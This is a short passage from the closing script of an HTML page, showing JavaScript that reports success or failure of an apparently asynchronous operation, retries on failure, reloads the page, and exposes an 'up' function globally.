        var msg='✔ '+j.m;
        if(j.v>0)msg+=' (retry '+j.v+')';
        setSt(msg);
        setTimeout(function(){location.reload();},500);
      }).catch(function(err){
        setSt('✘ '+name+' failed, fallback…');
        setTimeout(run,300);
      });
    }
    run();
  }
  window.up=up;
})();
</script></body></html>
